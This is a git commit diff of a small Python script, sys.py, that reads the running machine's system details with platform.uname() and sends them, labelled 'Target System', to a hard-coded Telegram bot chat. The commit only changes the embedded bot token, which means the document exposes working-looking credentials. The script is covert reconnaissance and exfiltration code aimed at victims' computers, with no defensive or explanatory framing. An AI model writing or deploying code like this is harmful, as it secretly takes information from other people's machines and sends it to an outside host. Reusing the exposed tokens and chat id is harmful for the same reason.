c08ce65a6ad8fcfa6d1c62d0acd502838450b884
MONSTER_SECURITY <69053807+MONSTER-hp@users.noreply.github.com>
2021-03-12 12:16:02 +0330

    Update sys.py

--- sys.py
+++ sys.py
@@ -1,7 +1,7 @@
 import requests
 import platform 
 info = platform.uname()
-url = "https://api.telegram.org/bot1611642670:AAEKRsaSXmhfVCYOVtJVEn9ccv36ekFmeew/SendMessage?chat_id=1119653364&text=Target System >>> "+str(info)
+url = "https://api.telegram.org/bot1608836427:AAGn1y1BbMZtiRLnClGTODzJ7U32hdQr_kk/SendMessage?chat_id=1119653364&text=Target System >>> "+str(info)
 payload = {"UrlBox":url,  
 "AgentList":"Mozilla Firefox",
 "VersionsList":"HTTP/1.1",
